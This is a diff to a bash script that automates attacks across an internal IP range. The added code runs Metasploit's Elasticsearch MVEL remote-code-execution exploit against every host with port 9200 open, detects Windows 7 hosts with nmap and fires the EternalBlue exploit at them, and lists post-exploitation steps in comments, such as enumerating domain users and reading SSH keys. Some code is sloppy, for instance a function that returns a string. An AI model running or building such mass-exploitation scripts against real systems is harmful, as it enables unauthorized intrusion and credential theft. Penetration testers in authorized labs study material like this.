@@ -264,6 +264,19 @@ for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; d
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
 fi
 defaultbasicfolder="./192.168.52.1-100"
 maybetry="./maybetry"
@@ -280,20 +293,97 @@ function ifmultiport() {
         $1 $2
     fi
 }
-function testldap () {
+
+
+echo testshit hier
+
+echo "" > reverslookup.lst
+function iplookup() {
     ip=$(echo $1 | cut -d "/" -f 4)
-    nmap --script=ldap* $ip | egrep -o "^\|.*" > "${1}389"
+
+    output=$(host "$ip")
+
+    # Check if the hostname is found or not
+    if [[ $output == *"not found"* || $output == *"NXDOMAIN"* ]]; then
+        echo "$ip:$ip" >> reverslookup.lst
+    else
+        # Extract the hostname from the output
+        hostname=$(echo "$output" | awk '{print $5}')
+        echo "$hostname:$ip" >> reverslookup.lst
+    fi
 }
-for f in $defaultbasicfolder/combined/*/; do ifmultiport testldap $f 389; done
+for f in $defaultbasicfolder/combined/*/; do iplookup $f; done
+function reverslookup() {
+    return $(cat reverslookup.lst | egrep "${1}:" | cut -d ":" -f 2)
+}
+
+echo $(reverslookup alakazam)
+
+
+function testelastic() {
+    ip=$(echo $1 | cut -d "/" -f 4)
+
+    msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $ip; exploit; shell;" 
+    ## -o $enumfile
+    # shell
+    # whoami
+    # ls /home
+    # ls /home/*
+    # sudo cat /home/*/.ssh/id_rsa.pub
+}
+
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testelastic $f 9200; done
+
+
+
+
+
+
+
+function testeternalblue() {
+    ip=$(echo $1 | cut -d "/" -f 4)
+    # echo $ip
+    nmap $ip --script=smb-vuln-ms17-010.nse
+    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; info; set rhosts $ip; exploit"   
+    # help
+    # getuid
+    #     ---NT authority\system -> pawned
+    # shell
+    # whoami
+    # net user
+    # net user /domain
+}
+
+function detectos(){
+    ip=$(echo $1 | cut -d "/" -f 4)
+    nmap $ip --script=smb-os-discovery.nse > "${1}os"
+}
+
+for f in $defaultbasicfolder/combined/*/; do detectos $f; done
+
+function ifos(){
+    if grep -q "$3" "${2}os"; then
+        $1 $2
+    fi
+}
+
+for f in $defaultbasicfolder/combined/*/; do ifos testeternalblue $f "windows 7"; done
+
+sudo apt install git
+git clone https://github.com/danielmiessler/SecLists.git
+
+
+
+
+
+
+
 
 
 # function testfunct () {
 #     echo $@
 # }
 # for f in $defaultbasicfolder/combined/*/; do ifmultiport testfunct $f 5432; done
-
-
-
 
 
 
